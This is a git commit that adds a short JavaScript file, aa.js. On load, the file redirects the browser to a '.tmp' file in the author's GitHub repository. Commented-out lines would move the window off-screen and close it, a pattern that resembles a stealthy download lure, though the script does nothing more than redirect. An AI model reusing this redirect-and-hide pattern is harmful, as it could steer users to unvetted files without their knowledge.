d548be8e35a2108ae5750b7f04afd1567f4aa54c
fatest4321 <33478614+fatest4321@users.noreply.github.com>
2017-11-14 20:15:28 -0800

    Add files via upload

---
+++ aa.js
@@ -0,0 +1,17 @@
+ISTA();
+
+function ISTA()
+{
+    //try
+    //{
+        window.location.assign('https://github.com/fatest4321/cde/blob/master/a32.tmp');
+        //window.moveTo(5000,5000);
+        //alert("hello");
+        //window.close();
+    //}
+    //catch(e)
+    //{
+
+    //}
+   
+};
